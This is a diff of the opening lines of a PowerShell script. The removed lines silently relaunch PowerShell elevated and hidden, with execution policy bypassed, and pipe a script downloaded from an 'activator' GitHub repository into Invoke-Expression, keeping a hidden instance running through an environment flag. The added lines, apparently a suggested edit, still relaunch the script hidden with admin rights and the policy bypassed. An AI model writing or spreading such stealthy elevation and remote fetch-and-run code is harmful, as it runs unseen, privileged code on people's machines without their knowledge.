@@ -1,22 +1,12 @@
-# Check if we need elevated privileges
+# Add these lines at the beginning of the script
 if (-not ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]'Administrator')) {
-    # If not admin, restart with admin rights and hidden
-    Start-Process PowerShell -ArgumentList "-WindowStyle Hidden -ExecutionPolicy Bypass -Command `"irm https://raw.githubusercontent.com/activator11/activator22/main/activator22.ps1 | iex`"" -Verb RunAs
-    exit
+    # If script is not running as admin and not hidden, restart it hidden
+    if ($Host.UI.RawUI.WindowStyle -ne 'Hidden') {
+        Start-Process PowerShell -ArgumentList "-WindowStyle Hidden -ExecutionPolicy Bypass -File `"$PSCommandPath`"" -Verb RunAs
+        exit
+    }
 }
-elseif ($Host.UI.RawUI.WindowStyle -ne 'Hidden') {
-    # If admin but not hidden, just start hidden instance
-    Start-Process PowerShell -ArgumentList "-WindowStyle Hidden -ExecutionPolicy Bypass -Command `"& {
-        # Set flag to prevent further window style checks
-        `$env:HIDDEN_INSTANCE = 'true'
-        irm https://raw.githubusercontent.com/activator11/activator22/main/activator22.ps1 | iex
-    }`""
-    exit
-}
-elseif (-not $env:HIDDEN_INSTANCE) {
-    # If somehow we got here without the flag, set it
-    $env:HIDDEN_INSTANCE = 'true'
-}
+
 
 # The rest of your original script remains the same
 $script:lastProcessedContentHash = $null
